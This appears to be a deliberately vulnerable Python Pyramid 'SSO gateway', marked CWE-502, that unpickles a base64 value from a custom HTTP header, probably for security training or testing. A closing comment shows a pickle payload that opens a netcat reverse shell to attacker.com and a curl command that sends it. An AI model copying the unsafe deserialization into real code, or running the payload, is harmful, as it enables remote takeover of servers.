import os
import uuid
import base64
import pickle
import sqlite3
import logging
from datetime import datetime
from wsgiref.simple_server import make_server
from pyramid.config import Configurator
from pyramid.response import Response
from pyramid.httpexceptions import HTTPForbidden, HTTPBadRequest

# Configure logging for the Enterprise SSO Gateway
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SSOGateway - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PyramidSSO")

DB_FILE = "sso_audit_log.db"

def init_audit_db():
    """Initializes the SQLite database for tracking SSO login attempts."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE login_audits (
            audit_id TEXT PRIMARY KEY,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            client_ip TEXT NOT NULL,
            username TEXT,
            auth_status TEXT NOT NULL,
            backend_system TEXT
        )
    ''')
    
    # Pre-populate with historical mock records
    mock_history = [
        ('req_abc123', datetime.now().isoformat(), '10.5.0.21', 'admin_user', 'SUCCESS', 'Legacy-HR-Portal'),
        ('req_def456', datetime.now().isoformat(), '10.5.0.55', 'unknown', 'FAILED', 'CRM-System')
    ]
    cursor.executemany('''
        INSERT INTO login_audits (audit_id, timestamp, client_ip, username, auth_status, backend_system)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', mock_history)
    
    conn.commit()
    conn.close()
    logger.info("SSO Audit database initialized.")

def log_audit_event(audit_id: str, client_ip: str, username: str, status: str, backend: str):
    """Records the outcome of an SSO authentication attempt."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO login_audits (audit_id, client_ip, username, auth_status, backend_system) VALUES (?, ?, ?, ?, ?)",
            (audit_id, client_ip, username, status, backend)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error logging audit {audit_id}: {e}")

class LegacySessionState:
    """Represents a legacy session object passed between internal services."""
    def __init__(self, username: str, role: str, privileges: list, backend_sys: str):
        self.username = username
        self.role = role
        self.privileges = privileges
        self.backend_sys = backend_sys

def deserialize_sso_state(base64_token: str, request_id: str) -> LegacySessionState:
    """
    VULNERABLE FUNCTION: CWE-502 Deserialization of Untrusted Data
    Trigger Path: Custom HTTP Header ('X-Legacy-SSO-State')
    """
    logger.info(f"[{request_id}] Decoding base64 legacy SSO state token.")
    
    try:
        # Vulnerability: The application extracts a base64-encoded string directly 
        # from an HTTP header and passes it to pickle.loads(). This architectural 
        # flaw exists to support backward compatibility with an old internal SSO 
        # system that serialized Python objects to pass session state.
        # An attacker can easily spoof this HTTP header with a crafted pickled 
        # payload containing a malicious __reduce__ method, resulting in Remote 
        # Code Execution (RCE) on the Pyramid web server.
        
        raw_bytes = base64.b64decode(base64_token)
        
        # CWE-502 occurs instantly upon unpickling the header payload.
        session_state = pickle.loads(raw_bytes)
        
        if isinstance(session_state, LegacySessionState):
            logger.debug(f"[{request_id}] Session decoded for user: {session_state.username}")
            return session_state
        else:
            logger.warning(f"[{request_id}] Decoded object is not a LegacySessionState.")
            return None
            
    except base64.binascii.Error as e:
        logger.error(f"[{request_id}] Invalid base64 encoding in token: {e}")
        return None
    except Exception as e:
        logger.error(f"[{request_id}] Failed to deserialize SSO state payload: {e}")
        return None

def health_check_view(request):
    """Simple health check endpoint for load balancers."""
    return Response(json_body={"status": "Pyramid SSO Gateway is online"}, content_type='application/json')

def sso_login_view(request):
    """Endpoint handling legacy SSO migrations via HTTP headers."""
    client_ip = request.client_addr or "unknown"
    request_id = f"req_{uuid.uuid4().hex[:8]}"
    
    # Extract the untrusted payload from the custom HTTP header
    sso_token = request.headers.get('X-Legacy-SSO-State')
    
    if not sso_token:
        logger.warning(f"[{request_id}] SSO login attempt without legacy token from {client_ip}")
        log_audit_event(request_id, client_ip, "NONE", "MISSING_TOKEN", "UNKNOWN")
        raise HTTPBadRequest(json_body={"error": "Missing X-Legacy-SSO-State header"})
        
    # Pass the untrusted header value directly to the vulnerable function
    session = deserialize_sso_state(sso_token, request_id)
    
    if session:
        log_audit_event(request_id, client_ip, session.username, "SUCCESS", session.backend_sys)
        return Response(
            json_body={
                "message": f"Welcome, {session.username}",
                "role": session.role,
                "token_id": request_id
            },
            content_type='application/json'
        )
    else:
        log_audit_event(request_id, client_ip, "UNKNOWN", "FAILED_AUTH", "UNKNOWN")
        raise HTTPForbidden(json_body={"error": "Invalid or corrupted legacy session token"})

if __name__ == '__main__':
    init_audit_db()
    
    # Configure the Pyramid WSGI application
    with Configurator() as config:
        config.add_route('health', '/api/health')
        config.add_view(health_check_view, route_name='health')
        
        config.add_route('sso_login', '/api/sso/legacy/auth')
        config.add_view(sso_login_view, route_name='sso_login', request_method='POST')
        
        app = config.make_wsgi_app()

    server_port = 6543
    server = make_server('0.0.0.0', server_port, app)
    logger.info(f"Starting Pyramid SSO Gateway on http://0.0.0.0:{server_port}")
    
    # Example Malicious Trigger:
    # 1. Attacker crafts a malicious pickle payload and base64 encodes it:
    #    import pickle, os, base64
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #    
    #    payload_b64 = base64.b64encode(pickle.dumps(Exploit())).decode('utf-8')
    #
    # 2. Attacker sends the payload to the API via the custom HTTP header:
    #    curl -X POST http://127.0.0.1:6543/api/sso/legacy/auth \
    #         -H "X-Legacy-SSO-State: $payload_b64"
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down SSO Gateway...")
